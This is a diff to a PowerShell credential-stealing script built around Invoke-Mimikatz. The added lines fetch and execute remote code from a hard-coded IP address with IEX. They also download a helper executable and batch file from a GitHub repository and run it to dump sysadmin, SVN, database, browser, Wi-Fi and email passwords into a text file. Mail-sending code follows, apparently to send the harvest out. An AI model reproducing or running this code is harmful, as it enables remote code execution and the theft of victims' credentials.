@@ -1,5 +1,11 @@
 $githuburl = 'https://github.com/begiilm/dy/raw/master/'
 $connectip = '106.80.36.165'
+
+
+
+IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
+IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
+
 function Invoke-Mimikatz
 {
 <#
@@ -2762,7 +2768,15 @@ $object2 = (Get-ChildItem env:\username).value + ' Report.zip'
 
 (new-object System.Net.WebClient).DownloadFile($githuburl + '/Get.rar','D:\Get.exe');
 (new-object System.Net.WebClient).DownloadFile($githuburl + '/run.rar','D:\run.bat');
-d:\run.bat
+D:\run.bat
+D:\Get.exe sysadmin >D:\GetPass.txt
+D:\Get.exe svn >>D:\GetPass.txt
+D:\Get.exe database >>D:\GetPass.txt
+D:\Get.exe browsers >>D:\GetPass.txt
+D:\Get.exe wifi >>D:\GetPass.txt
+D:\Get.exe emails>>D:\GetPass.txt
+
+
 $mail = New-Object System.Net.Mail.MailMessage
 #set the addresses
 $mail.From = New-Object System.Net.Mail.MailAddress('2014652020@email.ctbu.edu.cn','2014652020@email.ctbu.edu.cn')
